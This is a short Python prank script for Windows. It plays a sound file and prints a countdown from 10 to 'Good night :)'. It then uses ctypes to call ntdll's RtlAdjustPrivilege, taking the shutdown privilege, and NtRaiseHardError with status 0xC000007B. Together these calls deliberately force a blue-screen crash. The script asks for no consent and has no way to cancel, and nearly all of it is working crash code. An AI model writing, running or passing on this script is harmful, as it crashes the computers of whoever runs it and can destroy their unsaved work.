import pygame, sys, os
from audioplayer import AudioPlayer
from ctypes import POINTER
from threading import Thread
from pygame.locals import *
from ctypes import windll
from ctypes import c_int
from ctypes import c_uint
from ctypes import c_ulong
from ctypes import POINTER
from ctypes import byref

pygame.init()
print('cls')
def worker(): 
    AudioPlayer("data\lmao.wav").play(block=True)

			
t = Thread(target=worker)
t.daemon = True
t.start()

countdownLoop = True

while countdownLoop:
    os.system('cls')
    print("Shutdown in 10")
    pygame.time.delay(1000)
    os.system('cls')
    print("Shutdown in 09")
    pygame.time.delay(1000)
    os.system('cls')
    print("Shutdown in 08")
    pygame.time.delay(1000)
    os.system('cls')
    print("Shutdown in 07")
    pygame.time.delay(1000)
    os.system('cls')
    print("Shutdown in 06")
    pygame.time.delay(1000)
    os.system('cls')
    print("Shutdown in 05")
    pygame.time.delay(1000)
    os.system('cls')
    print("Shutdown in 04")
    pygame.time.delay(1000)
    os.system('cls')
    print("Shutdown in 03")
    pygame.time.delay(1000)
    os.system('cls')
    print("Shutdown in 02")
    pygame.time.delay(1000)
    os.system('cls')
    print("Shutdown in 01")
    pygame.time.delay(1000)
    os.system('cls')
    print("Shutdown in 00")
    print("Good night :)")
    pygame.time.delay(1500)
    break

nullptr = POINTER(c_int)()

windll.ntdll.RtlAdjustPrivilege(
    c_uint(19), 
    c_uint(1), 
    c_uint(0), 
    byref(c_int())
)

windll.ntdll.NtRaiseHardError(
    c_ulong(0xC000007B), 
    c_ulong(0), 
    nullptr, 
    nullptr, 
    c_uint(6), 
    byref(c_uint())
)